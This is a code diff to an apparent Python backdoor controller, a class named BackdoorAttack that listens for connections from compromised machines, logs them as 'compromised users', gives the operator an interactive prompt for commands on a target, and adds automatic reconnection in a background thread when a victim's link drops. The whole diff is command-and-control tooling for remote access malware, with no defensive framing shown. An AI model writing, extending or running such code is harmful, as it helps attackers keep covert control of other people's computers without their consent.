@@ -75,9 +75,30 @@ class BackdoorAttack:
     * Example Call:   attack = BackdoorAttack("192.168.1.11", 2000)
     """
     def __init__(self, ip, port):
+        self.ip = ip
+        self.port = port
+
         self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        self.listener.bind(("", port))
+        self.listener.bind(("", self.port))
+        self.listener.listen(0)
+
+        self.connection, self.address = self.listener.accept()
+        
+        BackdoorAttack.compromised_users[self.address[0]] = "IP: {} | {}".format(self.address[0], self.receive_data())
+        BackdoorAttack.compromised_sys_count += 1
+
+    """ 
+    * Function Name:  reconnect()
+    * Input:          self (BackdoorAttack object): Instance of the class.
+    * Output:         None
+    * Logic:          The function is used to reconnect with a compromised system  whose connection was broken earlier.
+    * Example Call:   self.reconnect()
+    """
+    def reconnect(self):
+        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.listener.bind(("", self.port))
         self.listener.listen(0)
 
         self.connection, self.address = self.listener.accept()
@@ -192,6 +213,7 @@ class BackdoorAttack:
     """
     def communicate(self):
         print("\nAttacking {}...\nEnter 'quit' to terminate connection / 'back' to return to main menu.".format(self.address[0]))
+        print("\nNOTE: Press Ctrl+C incase there is an unknown delay in response from the target. This may be because the connection with the target is broken.\n")
      
         while True:
             command = input("\n>> ").split(" ")
@@ -238,7 +260,7 @@ class BackdoorAttack:
                 print("\n\nUnable to connect with {}...".format(self.address[0]))
                 print("\nReturning back to main menu...\n")
                 self.close_connection()
-                return "quit"               
+                return "connection closed"               
 
 
 """ 
@@ -251,6 +273,17 @@ class BackdoorAttack:
 """
 def create_listener(ip, port):
     obj_list.append(BackdoorAttack(ip, port))
+
+""" 
+* Function Name:  reconnect()
+* Input:          option (integer): The index value of the object in the list.
+* Output:         None
+* Logic:          The function is used to reconnect with a compromised system  whose connection was broken earlier.
+* Example Call:   reconnect(2)
+"""
+def reconnect(option):
+    obj_list[option-1].reconnect()
+    obj_list.append(obj_list.pop(option-1))
 
 
 if __name__ == "__main__":
@@ -285,6 +318,11 @@ if __name__ == "__main__":
 
                             if(action == "quit"):
                                 obj_list.pop(int(option)-1)
+
+                            elif(action == "connection closed"):
+                                reconnect_thread  = Thread(target=reconnect, args=(int(option), ))
+                                reconnect_thread.daemon = True
+                                reconnect_thread.start()
 
                             if(BackdoorAttack.compromised_sys_count == 0):
                                 print_waiting = 1
